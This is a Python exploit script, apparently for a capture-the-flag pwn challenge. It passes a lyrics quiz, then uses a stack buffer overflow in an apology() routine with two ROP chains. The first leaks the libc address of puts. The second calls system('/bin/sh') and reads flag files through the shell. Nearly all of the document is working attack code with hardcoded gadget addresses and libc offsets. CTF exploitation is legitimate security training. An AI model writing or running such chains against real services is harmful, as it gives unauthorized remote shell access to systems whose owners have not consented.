#!/usr/bin/env python3
"""Johnny B Goode exploit.
1. Choose action "2" (Play some music).
2. Win 6 rounds of the lyrics quiz (correct lyric for round i is lyrics[i]).
3. apology() reads 0x100 into a 32-byte stack buffer -> BOF.
4. Stage 1: puts(puts_got) leaks libc, then return to apology to re-enter.
5. Stage 2: ret2system("/bin/sh").
"""
import socket, struct, time, re, sys

# Note: this challenge isn't a network service in the zip, so we assume it's
# served on the typical HackTheBox-event Docker port. Update HOST/PORT to match.
HOST = "localhost"   # placeholder — Alex will pass the live IP/port
PORT = 1337

# --- known addresses ---
APOLOGY     = 0x4009f6
POP_RDI     = 0x400ef3 + 0x400000 - 0x400000  # file off 0xef3 -> vaddr 0x400ef3
RET         = 0x40077e
PUTS_PLT    = 0x4007a0
PUTS_GOT    = 0x601f80

LIBC_PUTS_OFF   = 0x80aa0
LIBC_SYSTEM_OFF = 0x4f550
LIBC_BINSH_OFF  = 0x1b3e1a

LYRICS = [
    b"Deep down in Louisiana close to New Orleans",
    b"Way back up in the woods among the evergreens",
    b"There stood a log cabin made of earth and wood",
    b"Where lived a country boy named Johnny B. Goode",
    b"Who never ever learned to read or write so well",
    b"But he could play a guitar just like a-ringin' a bell",
]

p64 = lambda x: struct.pack("<Q", x & 0xffffffffffffffff)

def recvuntil(s, marker, timeout=10):
    s.settimeout(timeout)
    buf = b""
    while marker not in buf:
        chunk = s.recv(1)
        if not chunk: break
        buf += chunk
    return buf

def play_lyrics_round(s, i):
    """Read prompt until both '1. <lyric>\\n' and '2. <lyric>\\n' arrive, then send correct choice."""
    # The prompt format is: "<color>\nChoose lyrics:\n\n1. <a>\n2. <b>\n> "
    buf = recvuntil(s, b"> ")
    # parse the two choices
    m = re.search(rb"1\. (.+?)\n2\. (.+?)\n", buf)
    if not m:
        print("[!] failed to parse lyrics prompt:", repr(buf[-300:])); raise SystemExit(1)
    choice1, choice2 = m.group(1).strip(), m.group(2).strip()
    correct_lyric = LYRICS[i]
    if correct_lyric in choice1:
        answer = b"1\n"
    elif correct_lyric in choice2:
        answer = b"2\n"
    else:
        # The two choices may have color codes; do a fuzzy match
        c1_stripped = re.sub(rb"\x1b\[[\d;]*m", b"", choice1).strip()
        c2_stripped = re.sub(rb"\x1b\[[\d;]*m", b"", choice2).strip()
        if correct_lyric == c1_stripped:
            answer = b"1\n"
        elif correct_lyric == c2_stripped:
            answer = b"2\n"
        else:
            print(f"[!] round {i}: neither match {correct_lyric!r}\n  1: {c1_stripped!r}\n  2: {c2_stripped!r}")
            raise SystemExit(1)
    print(f"  round {i}: choice {answer.strip().decode()} ({correct_lyric.decode()[:40]}...)")
    s.sendall(answer)

def main():
    if len(sys.argv) >= 3:
        host, port = sys.argv[1], int(sys.argv[2])
    else:
        host, port = HOST, PORT
    s = socket.create_connection((host, port))

    # Navigate banner+story+action — wait for "Choose action" prompt
    recvuntil(s, b"> ")
    s.sendall(b"2\n")

    # Six rounds of the lyrics quiz
    for i in range(6):
        play_lyrics_round(s, i)

    # Now apology() is called — wait for its prompt
    apology_prompt = recvuntil(s, b"[Marty to his parents]: ")
    print("[+] reached apology prompt")

    # Stage 1: leak puts via puts(puts_got), then re-enter apology
    PAD = b"A" * 40
    chain1 = b"".join([
        PAD,
        p64(POP_RDI),
        p64(PUTS_GOT),
        p64(PUTS_PLT),
        p64(APOLOGY),
    ])
    s.sendall(chain1 + b"\n")

    # After read returns, apology prints '\x1b[1;34m\n[Marty to the crowd] : I guess
    # you guys aren\'t ready for that yet..\n\n' and then ret to ROP. ROP calls
    # puts(puts_got) which prints leak + \n. Then ROP returns into apology which
    # prints "[Marty to his parents]: " again.
    blob = recvuntil(s, b"I guess you guys aren't ready for that yet..\n\n")
    # The leak follows immediately: puts(puts_got) writes the bytes of the libc
    # puts address up to its first null. For 0x7fXXXXXXXXXX addresses that's
    # exactly 6 bytes, plus puts appends a newline -> 7 bytes total.
    # Any of those 6 bytes might be 0x0a; we don't search for newlines.
    s.settimeout(5)
    leak_bytes = b""
    while len(leak_bytes) < 6:
        c = s.recv(6 - len(leak_bytes))
        if not c: break
        leak_bytes += c
    # consume the trailing \n that puts emits
    s.recv(1)
    print(f"[DEBUG] leak bytes raw: {leak_bytes!r} ({leak_bytes.hex()})")
    libc_puts = int.from_bytes(leak_bytes.ljust(8, b"\x00"), "little")
    print(f"[+] libc puts = {hex(libc_puts)}")
    libc_base = libc_puts - LIBC_PUTS_OFF
    print(f"[+] libc base = {hex(libc_base)}")
    system_addr = libc_base + LIBC_SYSTEM_OFF
    binsh_addr  = libc_base + LIBC_BINSH_OFF
    print(f"[+] system    = {hex(system_addr)}")
    print(f"[+] /bin/sh   = {hex(binsh_addr)}")

    # Stage 2: ret2system. Send second BOF.
    chain2 = b"".join([
        PAD,
        p64(RET),         # stack-align for movaps inside system
        p64(POP_RDI),
        p64(binsh_addr),
        p64(system_addr),
    ])
    s.sendall(chain2 + b"\n")

    time.sleep(0.5)
    s.sendall(b"cat flag.txt; cat /flag.txt; cat /home/*/flag.txt 2>/dev/null\n")
    time.sleep(0.5)
    s.settimeout(3)
    try:
        out = s.recv(8192)
        print("\n[+] shell output:")
        print(out.decode(errors='replace'))
    except socket.timeout:
        print("[!] shell timed out")
    s.close()

if __name__ == "__main__":
    main()
